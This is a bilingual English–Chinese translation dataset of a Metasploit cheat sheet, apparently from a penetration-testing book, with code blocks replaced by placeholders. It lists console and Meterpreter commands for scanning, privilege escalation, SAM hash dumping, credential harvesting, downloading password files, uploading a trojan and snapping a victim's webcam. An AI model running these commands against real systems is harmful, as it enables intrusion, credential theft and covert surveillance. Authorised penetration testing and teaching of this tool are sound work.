- en: Metasploit Cheat Sheet
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit备忘单
- en: Before starting the exploitation phase, you must know the Metasploit framework
    from start to finish, so I have prepared a quick reference (a cheat sheet) to
    the Metasploit framework for you.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始利用阶段之前，你必须从头到尾了解Metasploit框架，因此我为你准备了一个Metasploit框架的快速参考（备忘单）。
- en: Metasploit framework
  id: totrans-2
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit框架
- en: 'Start a Metasploit with the following script file:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 使用以下脚本文件启动Metasploit：
- en: '[PRE0]'
  id: totrans-4
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'To run Metasploit, use the following command:'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 要运行Metasploit，使用以下命令：
- en: '[PRE1]'
  id: totrans-6
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: Using the database
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用数据库
- en: 'In Kali Linux, you will need to start up the `postgresql` server before using
    the database:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 在Kali Linux中，使用数据库之前需要启动`postgresql`服务器：
- en: '[PRE2]'
  id: totrans-9
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'After starting `postgresql`, you will need to create and initialize the `msf`
    database with `msfdb init`:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 启动`postgresql`后，你需要使用`msfdb init`创建并初始化`msf`数据库：
- en: '[PRE3]'
  id: totrans-11
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'If you just created a new exploit and want to refresh `metasploit db` to start
    using the newly created exploit, enter the following:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你刚创建了一个新的漏洞利用并想要刷新`metasploit db`以开始使用新创建的漏洞利用，请输入以下命令：
- en: '[PRE4]'
  id: totrans-13
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Then, type the following command:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，输入以下命令：
- en: '[PRE5]'
  id: totrans-15
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: The `-q` will start `msfconsole` in debug mode, so if you made mistakes in your
    new exploit class, the debugger will then print it to the screen.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: '`-q`将以调试模式启动`msfconsole`，因此如果你在新的漏洞利用类中犯了错误，调试器将把错误信息打印到屏幕上。'
- en: More database-related commands
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 更多与数据库相关的命令
- en: '`msf > db_status`: This will confirm that Metasploit is successfully connected
    to the database'
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > db_status`：此命令将确认Metasploit是否成功连接到数据库'
- en: '`msf > workspace`: This will display the currently selected workspaces'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > workspace`：这将显示当前选择的工作区'
- en: '`msf > workspace [new workspace]`: This changes the current workspace to the
    new one selected'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > workspace [新工作区]`：这将把当前工作区切换为所选的新工作区'
- en: '`msf > workspace -a [the name of the workspace to add]`: This is the name of
    the workspace to add'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > workspace -a [要添加的工作区名称]`：这是要添加的工作区名称'
- en: '`msf > workspace -d [the name of the workspace to delete]`: This is the name
    of the workspace to delete'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > workspace -d [要删除的工作区名称]`：这是要删除的工作区名称'
- en: '`msf > db_import [XML folder path]`: This will import a file from an earlier
    scan, for example, `db_import /root/msfu/nmapScan`'
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > db_import [XML文件夹路径]`：这将导入先前扫描的文件，例如`db_import /root/msfu/nmapScan`'
- en: '`msf > db_nmap [nmap arguments]`: This will scan using Nmap, for example, `db_nmap
    -A 172.16.194.134`'
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > db_nmap [nmap参数]`：这将使用Nmap进行扫描，例如`db_nmap -A 172.16.194.134`'
- en: '`msf > hosts`: This will list the hosts after a scan'
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > hosts`：此命令将在扫描后列出发现的主机'
- en: '`msf > services`: This will list the services found after a scan'
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > services`：此命令将在扫描后列出发现的服务'
- en: '`msf > creds`: This will list any found credentials after a brute-force scan'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > creds`：此命令将在暴力破解扫描后列出任何找到的凭证'
- en: '`msf > loot`: This will retrieve hash dumps if you have already compromised
    a system'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > loot`：如果你已经攻破了系统，这将获取哈希转储'
- en: '`msf > db_export -f [format] [xml file path]`: For example, `-``db_export -f
    xml /root/msfu/Exported.xml`'
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > db_export -f [格式] [XML文件路径]`：例如，`db_export -f xml /root/msfu/Exported.xml`'
- en: Getting around
  id: totrans-30
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 环境导航
- en: '`msf > search`: This will locate a specific module according to the search
    criteria that you provide (try to execute `help search`)'
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > search`：此命令将根据你提供的搜索条件查找特定模块（尝试执行`help search`）'
- en: '`msf > search [any keyword]`: For example, `search apache version 2.3`'
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > search [任何关键词]`：例如，`search apache version 2.3`'
- en: '`msf > grep & search`: For example, `grep http search apache`'
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > grep & search`：例如，`grep http search apache`'
- en: '**Search keywords**:'
  id: totrans-34
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**搜索关键词**：'
- en: '`app`: Modules that are client or server attacks'
  id: totrans-35
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`app`：客户端或服务器攻击模块'
- en: '`author`: Modules written by this author'
  id: totrans-36
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`author`：此作者编写的模块'
- en: '`bid`: Modules with a matching Bugtraq ID'
  id: totrans-37
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`bid`：具有匹配Bugtraq ID的模块'
- en: '`cve`: Modules with a matching CVE ID'
  id: totrans-38
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`cve`：具有匹配CVE ID的模块'
- en: '`edb`: Modules with a matching Exploit-DB ID'
  id: totrans-39
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`edb`：具有匹配Exploit-DB ID的模块'
- en: '`name`: Modules with a matching descriptive name'
  id: totrans-40
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`name`：具有匹配描述名称的模块'
- en: '`platform`: Modules affecting this platform'
  id: totrans-41
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`platform`：影响此平台的模块'
- en: '`ref`: Modules with a matching `ref`'
  id: totrans-42
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ref`：具有匹配`ref`的模块'
- en: '`type`: Modules of a specific type (exploit, auxiliary, or post)'
  id: totrans-43
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`type`：特定类型（exploit、auxiliary或post）的模块'
- en: '**Examples**:'
  id: totrans-44
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**示例**：'
- en: '`msf > search cve:2009 type:exploit app:client`'
  id: totrans-45
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > search cve:2009 type:exploit app:client`'
- en: '`msf > search name:mysql`'
  id: totrans-46
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > search name:mysql`'
- en: '`msf > search platform:windows`'
  id: totrans-47
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > search platform:windows`'
- en: '`msf > search type:auxiliary`'
  id: totrans-48
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > search type:auxiliary`'
- en: '**More commands**:'
  id: totrans-49
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**更多命令**：'
- en: '`msf > help`: List the available commands'
  id: totrans-50
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > help`：列出可用命令'
- en: '`msf > back`: Go back one step'
  id: totrans-51
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > back`：返回一步'
- en: '`msf > exit`: Exit msfconsole'
  id: totrans-52
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > exit`：退出msfconsole'
- en: Using modules
  id: totrans-53
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用模块
- en: '`msf > use [module name]`: Select a module to use it. For example, use `dos/windows/smb/ms09_001_write`.'
  id: totrans-54
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > use [module name]`: 选择一个模块并使用它。例如，使用 `dos/windows/smb/ms09_001_write`。'
- en: '`msf > show`: This will show info about a specific item in Metasploit.'
  id: totrans-55
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show`: 这将显示 Metasploit 中某个特定项目的信息。'
- en: '`msf > show`: Entering `show` at the `msfconsole` prompt will display every
    module within Metasploit.'
  id: totrans-56
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show`: 在 `msfconsole` 提示符下输入 `show` 将显示 Metasploit 中的每个模块。'
- en: '`msf > show options`: This will show the module options.'
  id: totrans-57
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show options`: 这将显示模块的选项。'
- en: '`msf > show auxiliary`: This will display a list of all of the available auxiliary
    modules within Metasploit.'
  id: totrans-58
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show auxiliary`: 这将显示 Metasploit 中所有可用的辅助模块的列表。'
- en: '`msf > show exploits`: This will get a listing of all exploits contained in
    the framework.'
  id: totrans-59
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show exploits`: 这将列出框架中所有的漏洞利用。'
- en: '`msf > show payloads`: This will display all of the different payloads (either
    within Metasploit or in the same module).'
  id: totrans-60
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show payloads`: 这将显示所有不同的有效载荷（无论是 Metasploit 中的，还是同一模块中的）。'
- en: '`msf > show targets`: This will display which targets are supported within
    the context of an exploit module.'
  id: totrans-61
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show targets`: 这将显示在漏洞模块的上下文中支持哪些目标。'
- en: '`msf > show advanced`: This will show you more advanced options if you wish
    to further fine-tune an exploit.'
  id: totrans-62
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show advanced`: 如果你想进一步调整漏洞利用，使用此命令查看更多高级选项。'
- en: '`msf > show encoders`: This will display a list of the encoders that are available
    within msfconsole.'
  id: totrans-63
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show encoders`: 这将显示 msfconsole 中可用的编码器列表。'
- en: '`msf > show nops`: This will display the NOP generators that Metasploit has
    to offer.'
  id: totrans-64
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > show nops`: 这将显示 Metasploit 提供的 NOP 生成器列表。'
- en: '`msf > info [module name]`: This will provide you with detailed information
    about a module. For example, `info exploit/windows/http/apache_chunked`.'
  id: totrans-65
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > info [module name]`: 这将提供关于某个模块的详细信息。例如，`info exploit/windows/http/apache_chunked`。'
- en: '`msf > check`: This will verify whether the target is vulnerable, but you will
    need to set the options first.'
  id: totrans-66
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > check`: 这将验证目标是否存在漏洞，但你需要先设置选项。'
- en: '`msf > set`: The `set` command allows you to configure the framework options
    and parameters for the current module you are working with. For example, `set
    RHOST 172.16.194.134`.'
  id: totrans-67
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > set`: `set` 命令允许你为当前正在使用的模块配置框架选项和参数。例如，`set RHOST 172.16.194.134`。'
- en: '`msf > setg`: This will set global variables within `msfconsole`. For example, `setg
    LHOST 10.0.0.100`.'
  id: totrans-68
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > setg`: 这将设置 `msfconsole` 中的全局变量。例如，`setg LHOST 10.0.0.100`。'
- en: '`msf > unset`: The `unset` command removes a parameter that has been previously
    configured with `set`. You can remove all assigned variables with `unset all`.
    For example, `unset THREADS`.'
  id: totrans-69
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > unset`: `unset` 命令删除先前通过 `set` 配置的参数。你可以通过 `unset all` 删除所有已分配的变量。例如，`unset
    THREADS`。'
- en: '`msf > save`: The `save` command will save your current environment and settings.'
  id: totrans-70
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > save`: `save` 命令将保存当前的环境和设置。'
- en: '`msf > jobs [option]`: The `jobs` command provides the ability to list and
    terminate these jobs. Use the `jobs -h` command to get the available options.
    For example, `jobs -l`.'
  id: totrans-71
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > jobs [option]`: `jobs` 命令提供列出和终止这些任务的功能。使用 `jobs -h` 命令获取可用选项。例如，`jobs
    -l`。'
- en: Miscellaneous
  id: totrans-72
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 杂项
- en: '`msf > load [plugin name]`: The `load` command loads a plugin from Metasploit''s
    plugin directory. Arguments are passed as `key=val` on the shell. For example,
    `load pcap_log`.'
  id: totrans-73
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > load [plugin name]`: `load` 命令从 Metasploit 的插件目录加载插件。参数通过 `key=val`
    的形式传递给 shell。例如，`load pcap_log`。'
- en: '`msf > unload [plugin name]`: The `unload` command unloads a previously loaded
    plugin and removes any extended commands. For example, `unload pcap_log`.'
  id: totrans-74
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > unload [plugin name]`: `unload` 命令卸载先前加载的插件并移除任何扩展命令。例如，`unload pcap_log`。'
- en: '`msf > loadpath [module path]`: The `loadpath` command will load a third-party
    module tree for the path so you can point Metasploit at your 0-day exploits, encoders,
    payloads, and so on. For example, `loadpath exploit/windows/test/test_module`.'
  id: totrans-75
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > loadpath [module path]`: `loadpath` 命令将加载一个第三方模块路径，以便你可以将 Metasploit
    指向你的 0-day 漏洞、编码器、有效载荷等。例如，`loadpath exploit/windows/test/test_module`。'
- en: '`msf > connect [IP]`: This is similar to `netcat`. It is good for banner grabbing
    and interacting with the service. For example, `connect 192.168.1.10`.'
  id: totrans-76
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > connect [IP]`: 这与 `netcat` 类似，适用于横幅抓取和与服务交互。例如，`connect 192.168.1.10`。'
- en: msfvenom
  id: totrans-77
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom
- en: '`msfvenom` can be used, for example, to generate a reverse TCP Meterpreter
    payload for Windows OS:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '`msfvenom` 可以用于生成 Windows 操作系统的反向 TCP Meterpreter 有效载荷，例如：'
- en: '[PRE6]'
  id: totrans-79
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: '**Platforms**: The following are the platform values that we can use:'
  id: totrans-80
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**平台**: 以下是我们可以使用的平台值：'
- en: '`Cisco` or `cisco`, `OSX` or `osx`, `Solaris` or `solaris`, `BSD` or `bsd`, `OpenBSD`
    or `openbsd`, `hardware`, `Firefox` or `firefox`, `BSDi` or `bsdi`, `NetBSD` or
    `netbsd`, `NodeJS` or `nodejs`, `FreeBSD` or `freebsd`, `Python` or `python`,
    `AIX` or `aix`, `JavaScript` or `javascript`, `HPUX` or `hpux`, `PHP` or `php`,
    `Irix` or `irix`, `Unix` or `unix`, `Linux` or `linux`, `Ruby` or `ruby`, `Java`
    or `java`, `Android` or `android`, `Netware` or `netware`, `Windows` or `windows`,
    `mainframe`, `multi`.'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: '`Cisco` 或 `cisco`，`OSX` 或 `osx`，`Solaris` 或 `solaris`，`BSD` 或 `bsd`，`OpenBSD`
    或 `openbsd`，`hardware`，`Firefox` 或 `firefox`，`BSDi` 或 `bsdi`，`NetBSD` 或 `netbsd`，`NodeJS`
    或 `nodejs`，`FreeBSD` 或 `freebsd`，`Python` 或 `python`，`AIX` 或 `aix`，`JavaScript`
    或 `javascript`，`HPUX` 或 `hpux`，`PHP` 或 `php`，`Irix` 或 `irix`，`Unix` 或 `unix`，`Linux`
    或 `linux`，`Ruby` 或 `ruby`，`Java` 或 `java`，`Android` 或 `android`，`Netware` 或 `netware`，`Windows`
    或 `windows`，`mainframe`，`multi`。'
- en: '**Executable formats**: The following are the executable formats that we can
    use:'
  id: totrans-82
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**可执行格式**：以下是我们可以使用的可执行格式：'
- en: '`asp`, `aspx`, `aspx-exe`, `dll`, `elf`, `elf-so`, `exe`, `exe-only`, `exe-service`,
    `exe-small`, `hta-psh`, `loop-vbs`, `macho`, `msi`, `msi-nouac`, `osx-app`, `psh`,
    `psh-net`, `psh-reflection`, `psh-cmd`, `vba`, `vba-exe`, `vba-psh`, `vbs`, `war`.'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '`asp`，`aspx`，`aspx-exe`，`dll`，`elf`，`elf-so`，`exe`，`exe-only`，`exe-service`，`exe-small`，`hta-psh`，`loop-vbs`，`macho`，`msi`，`msi-nouac`，`osx-app`，`psh`，`psh-net`，`psh-reflection`，`psh-cmd`，`vba`，`vba-exe`，`vba-psh`，`vbs`，`war`。'
- en: '**Transform formats**: The following are the transform formats that we can
    use:'
  id: totrans-84
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**转换格式**：以下是我们可以使用的转换格式：'
- en: '`bash`, `c`, `csharp`, `dw`, `dword`, `hex`, `java`, `js_be`, `js_le`, `num`,
    `perl`, `pl`, `powershell`, `ps1`, `py`, `python`, `raw`, `rb`, `ruby`, `sh`,
    `vbapplication`, `vbscript`.'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: '`bash`，`c`，`csharp`，`dw`，`dword`，`hex`，`java`，`js_be`，`js_le`，`num`，`perl`，`pl`，`powershell`，`ps1`，`py`，`python`，`raw`，`rb`，`ruby`，`sh`，`vbapplication`，`vbscript`。'
- en: Listener scripting
  id: totrans-86
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 监听脚本
- en: '[PRE7]'
  id: totrans-87
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: Meterpreter
  id: totrans-88
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Meterpreter
- en: '`msf > sessions [options or ID]`: The `sessions` command allows you to list,
    interact with, and kill spawned sessions. The sessions can be shells, Meterpreter
    sessions, VNCs, and so on (use `sessions -h` to get help).'
  id: totrans-89
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > sessions [选项或 ID]`：`sessions` 命令允许你列出、交互并结束已生成的会话。会话可以是 shell、Meterpreter
    会话、VNC 等（使用 `sessions -h` 获取帮助）。'
- en: '`meterpreter > background`: This will send the current Meterpreter session
    to the background and return you to the `msf` prompt.'
  id: totrans-90
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > background`：将当前的 Meterpreter 会话发送到后台，并返回到 `msf` 提示符。'
- en: '`meterpreter > getuid`: Displays to the user whether the Meterpreter server
    is running on the host.'
  id: totrans-91
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > getuid`：显示 Meterpreter 服务器是否在主机上运行。'
- en: '`meterpreter > sysinfo`: Displays the victim''s OS info.'
  id: totrans-92
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > sysinfo`：显示受害者的操作系统信息。'
- en: '`meterpreter > cd`: Changes the current directory on the compromised system.'
  id: totrans-93
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > cd`：更改受感染系统上的当前目录。'
- en: '`meterpreter > ls`: Lists the current directory''s contents.'
  id: totrans-94
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > ls`：列出当前目录中的文件。'
- en: '`meterpreter > pwd`: Prints the current directory on the compromised system.'
  id: totrans-95
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > pwd`：打印受感染系统上的当前目录。'
- en: '`meterpreter > ps`: Displays a list of running processes on the target.'
  id: totrans-96
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > ps`：显示目标主机上正在运行的进程列表。'
- en: '`meterpreter > run post/windows/manage/migrate`: Migrates to another process
    on the victim.'
  id: totrans-97
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/manage/migrate`：迁移到受害者的另一个进程。'
- en: '`meterpreter > use priv`:  Use this command before executing the `getsystem`
    command.'
  id: totrans-98
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > use priv`：在执行 `getsystem` 命令之前使用此命令。'
- en: '`meterpreter > getsystem`: Use this command to elevate your privileges.'
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > getsystem`：使用此命令提升你的权限。'
- en: 'If you get the error `priv_elevate_getsystem: Operation failed: Access is denied`,
    then follow these steps:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: '如果你遇到错误 `priv_elevate_getsystem: 操作失败：访问被拒绝`，请按照以下步骤操作：'
- en: '[PRE8]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '**Option 1**:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: '**选项 1**：'
- en: '[PRE9]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: '**Option 2**:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: '**选项 2**：'
- en: '`msf > use exploit/windows/local/`: List of all Windows exploits.'
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > use exploit/windows/local/`：列出所有 Windows 漏洞。'
- en: '`msf > use exploit/windows/local/ms10_015_kitrap0d`: We''ve chosen one exploit
    from the list, as follows:'
  id: totrans-106
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf > use exploit/windows/local/ms10_015_kitrap0d`：我们从列表中选择了一个漏洞，具体如下：'
- en: '[PRE10]'
  id: totrans-107
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '`meterpreter > search`: Provides a way of locating specific files on the target
    host. For example, `search -f passwords*.txt`.'
  id: totrans-108
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > search`：提供在目标主机上查找特定文件的方法。例如，`search -f passwords*.txt`。'
- en: '`meterpreter > cat [file name path]`: Displays the content of a file when it''s
    given as an argument.'
  id: totrans-109
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > cat [文件名路径]`：当提供文件路径作为参数时，显示文件内容。'
- en: '`meterpreter > download [file name path]`: Downloads a file from the remote
    machine. Note the use of the double-slashes when giving the Windows path. For
    example, `download C:\\passwords.txt`.'
  id: totrans-110
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > download [文件名路径]`：从远程主机下载文件。注意，提供 Windows 路径时要使用双斜杠。例如，`download
    C:\\passwords.txt`。'
- en: '`meterpreter > upload [local file name] [remote path]`: For example, `upload
    evil_trojan.exe c:\\windows\\system32`.'
  id: totrans-111
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > upload [local file name] [remote path]`：例如，`upload evil_trojan.exe
    c:\\windows\\system32`。'
- en: '`meterpreter > execute [command]`: Runs a command on the target system'
  id: totrans-112
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > execute [command]`：在目标系统上运行命令。'
- en: '`meterpreter > shell`: Executes the shell (Terminal or DOS) on the target system.'
  id: totrans-113
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > shell`：在目标系统上执行Shell（终端或DOS）。'
- en: '`meterpreter > run post/windows/gather/hashdump`: A post module that will dump
    the contents of the SAM database.'
  id: totrans-114
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/hashdump`：一个后期模块，用于转储SAM数据库的内容。'
- en: '`meterpreter >ipconfig`: Displays the network interfaces and addresses on the
    remote machine.'
  id: totrans-115
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > ipconfig`：显示远程机器上的网络接口和地址。'
- en: '`meterpreter > webcam_list`: Displays the currently available webcams on the
    target host.'
  id: totrans-116
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > webcam_list`：显示目标主机上当前可用的摄像头列表。'
- en: '`meterpreter > webcam_snap`: Grabs a picture from a connected webcam on the
    target system and saves it to disc as a JPEG image. By default, the save location
    is the local current working directory with a randomized filename. For example,
    `webcam_snap -i 1 -v false`.'
  id: totrans-117
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > webcam_snap`：从目标系统连接的网络摄像头抓取一张图片，并将其保存为JPEG图像到磁盘。默认情况下，保存位置是本地当前工作目录，文件名随机生成。例如，`webcam_snap
    -i 1 -v false`。'
- en: '`meterpreter > python_import [local python file]`: Imports a local Python file
    and executes it on the victim''s machine. For example,  `meterpreter > python_import
    -f /root/readAutoLogonREG.py`.'
  id: totrans-118
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > python_import [local python file]`：导入本地Python文件并在受害者的机器上执行。例如，`meterpreter
    > python_import -f /root/readAutoLogonREG.py`。'
- en: '`meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24`'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24`'
- en: '`meterpreter > run post/windows/gather/checkvm`: Checks to see if the compromised
    host is a virtual machine.'
  id: totrans-120
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/checkvm`：检查受害主机是否为虚拟机。'
- en: '`meterpreter > run post/windows/gather/credentials/credential_collector`: Harvests
    passwords hashes and tokens on the compromised host.'
  id: totrans-121
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/credentials/credential_collector`：在被攻陷的主机上收集密码哈希和令牌。'
- en: '`meterpreter > run post/windows/gather/dumplinks`: The `dumplinks` module parses
    the `.lnk` files in a user''s recent documents, which could be useful for further
    information gathering.'
  id: totrans-122
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/dumplinks`：`dumplinks`模块解析用户最近文档中的`.lnk`文件，这对于进一步的信息收集非常有用。'
- en: '`meterpreter > run post/windows/gather/enum_applications`: Enumerates the applications
    that are installed on the compromised host.'
  id: totrans-123
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/enum_applications`：枚举在受害主机上安装的应用程序。'
- en: '`meterpreter > run post/windows/gather/enum_logged_on_users`: Returns a list
    of current and recently logged on users, along with their SIDs.'
  id: totrans-124
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/enum_logged_on_users`：返回当前和最近登录的用户列表及其SID。'
- en: '`meterpreter > run post/windows/gather/enum_shares`: Returns a list of both
    configured and recently used shares on the compromised system.'
  id: totrans-125
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/enum_shares`：返回在受害系统上配置和最近使用的共享列表。'
- en: '`meterpreter > run post/windows/gather/enum_snmp`: Enumerates the SNMP service
    configuration on the target, if present, including the community strings.'
  id: totrans-126
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/enum_snmp`：枚举目标上的SNMP服务配置（如果存在），包括社区字符串。'
